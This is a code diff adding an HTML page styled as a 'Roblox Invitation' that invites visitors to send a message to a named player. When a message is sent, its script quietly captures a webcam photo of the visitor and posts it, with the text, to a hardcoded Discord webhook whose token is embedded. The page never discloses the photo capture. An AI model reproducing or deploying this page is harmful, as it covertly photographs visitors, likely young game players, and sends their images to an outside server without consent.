@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Invitation</title>
+    <style>
+        /* Apply a background gradient animation */
+        body {
+            background: linear-gradient(90deg, #ff9a8b, #ff6a88, #ff6a88, #ff9a8b);
+            background-size: 400% 100%;
+            animation: backgroundAnimation 10s infinite;
+        }
+
+        @keyframes backgroundAnimation {
+            0% {
+                background-position: 200% 0;
+            }
+            100% {
+                background-position: -200% 0;
+            }
+        }
+
+        /* Style the message and buttons */
+        h1 {
+            font-size: 28px;
+            text-align: center;
+            color: #fff;
+            margin-top: 50px;
+            animation: fadeInUp 1s;
+        }
+
+        .button-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        button {
+            display: inline-block;
+            margin: 0 10px;
+            padding: 10px 20px;
+            background-color: #3498db;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+            transform: scale(1.05);
+        }
+
+        /* Animation for fadeInUp */
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Style for displaying the image */
+        #image-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        #captured-image {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Loading screen styles */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            display: none; /* Initially hidden */
+        }
+
+        #loading-text {
+            font-size: 24px;
+            color: #fff;
+        }
+
+        /* Message input styles */
+        #message-input {
+            text-align: center;
+            margin-top: 20px;
+            animation: slideIn 1s; /* Add animation */
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Align content to the middle */
+        }
+
+        @keyframes slideIn {
+            0% {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        #message-textarea {
+            width: 80%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+        }
+
+        #send-message-button {
+            background-color: #3498db;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s, transform 0.2s;
+            margin-top: 10px; /* Add margin for spacing */
+        }
+
+        #send-message-button:hover {
+            background-color: #2980b9;
+            transform: scale(1.05);
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const buttonContainer = document.createElement('div');
+            buttonContainer.className = 'button-container';
+
+            const sendButton = document.createElement('button');
+            sendButton.textContent = 'Send a message for Squidygamingg!';
+            sendButton.id = 'sendButton';
+
+            const loadingScreen = document.createElement('div');
+            loadingScreen.id = 'loading-screen';
+
+            const loadingText = document.createElement('div');
+            loadingText.id = 'loading-text';
+            loadingText.textContent = 'Loading...';
+
+            document.body.appendChild(buttonContainer);
+            buttonContainer.appendChild(sendButton);
+
+            document.body.appendChild(loadingScreen);
+            loadingScreen.appendChild(loadingText);
+
+            sendButton.addEventListener('click', () => {
+                // Hide the send button
+                sendButton.style.display = 'none';
+
+                // Create message input elements
+                const messageInput = document.createElement('div');
+                messageInput.id = 'message-input';
+
+                const messageTextarea = document.createElement('textarea');
+                messageTextarea.id = 'message-textarea';
+                messageTextarea.placeholder = 'Enter your message...';
+
+                const sendMessageButton = document.createElement('button');
+                sendMessageButton.textContent = 'Send Message';
+                sendMessageButton.id = 'send-message-button';
+
+                messageInput.appendChild(messageTextarea);
+                messageInput.appendChild(sendMessageButton);
+
+                document.body.appendChild(messageInput);
+
+                sendMessageButton.addEventListener('click', async () => {
+                    const messageText = messageTextarea.value;
+
+                    if (messageText) {
+                        // Display the loading screen
+                        loadingScreen.style.display = 'flex';
+
+                        // Capture front camera image
+                        const imageBlob = await captureFrontCameraImage();
+
+                        // Send a message with the captured image and text using a Discord webhook
+                        sendMessageWithImageAndText(imageBlob, messageText);
+
+                        // Hide the message input
+                        messageInput.style.display = 'none';
+
+                        // Show the send button again
+                        sendButton.style.display = 'block';
+
+                        // Hide the loading screen
+                        loadingScreen.style.display = 'none';
+                    }
+                });
+            });
+        });
+
+        // Function to capture front camera image
+        async function captureFrontCameraImage() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                await video.play();
+
+                // Capture a frame from the video stream as an image
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the captured frame to a data URL (base64)
+                const imageBlob = canvas.toDataURL('image/jpeg');
+
+                // Stop the camera stream and remove the video element
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+
+                return imageBlob;
+            } catch (error) {
+                console.error('Error capturing image:', error);
+                return null;
+            }
+        }
+
+        // Function to send a message with an image and text using a Discord webhook
+        function sendMessageWithImageAndText(imageBlob, messageText) {
+            // Replace 'YOUR_WEBHOOK_URL_HERE' with your actual Discord webhook URL
+            const webhookURL = 'https://discordapp.com/api/webhooks/1156295739438276608/_9y-AowFIIMfpYlSB_h2Ya7nvo1ehBeuUvpn4y-GqOA7WEzIksm0Np-Yee47OdO2_Bdl';
+
+            const formData = new FormData();
+            formData.append('file', dataURItoBlob(imageBlob), 'image.jpg');
+            formData.append('content', messageText);
+
+            fetch(webhookURL, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => {
+                console.log('Image and text sent to Discord webhook.');
+            })
+            .catch(error => {
+                console.error('Error sending image and text to Discord webhook:', error);
+            });
+        }
+
+        // Helper function to convert data URI to Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</head>
+<body>
+    <h1>TEST ONLY</h1>
+</body>
+</html>
